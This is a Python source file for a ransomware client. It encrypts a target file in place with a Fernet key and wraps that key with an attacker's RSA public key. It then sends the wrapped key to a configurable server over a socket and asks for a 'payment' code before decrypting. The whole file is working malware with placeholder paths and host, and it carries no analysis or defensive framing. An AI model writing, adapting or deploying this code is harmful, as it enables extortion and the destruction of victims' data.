from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import socket

symmetricKey  = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)
with open("directory of public key", "rb") as key_file:
	public_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend())

encryptedSymmetricKey = public_key.encrypt(symmetricKey, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))

with open("encryptedSymmetricKey.key", "wb") as key_file:
	key_file.write(encryptedSymmetricKey)

filePath = "directory of file(s) to encrypt"

with open(filePath, "rb") as file:
	file_data = file.read()
	encrypted_data = FernetInstance.encrypt(file_data)

with open(filePath, "wb") as file:
	file.write(encrypted_data)

def sendEncryptedKey(eKeyFilePath):
	hostname, port = "", 8080 #configure hostname, port needs to match server
	with socket.create_connection((hostname, port)) as sock:
		with open(eKeyFilePath, "rb") as file:
			sock.send(file.read())
			return sock.recv(5000) #for up to 4096 bit RSA key

def decryptFile(filePath, key):
	with open(filePath, "rb") as file:
		file_data = file.read()
		decrypted_data = FernetInstance.decrypt(file_data)
	with open(filePath, "wb") as file:
		file.write(decrypted_data)

payment = input("Enter code to decrypt: ") #acting as receipt
if payment == "secret_password": #specify password
	symmetricKey_received = sendEncryptedKey("directory of encryptedSymmetricKey.key") #same directory as other files, including this client script
	decryptFile("directory of file(s) that were encrypted", symmetricKey_received) #same directory as filePath variable
quit()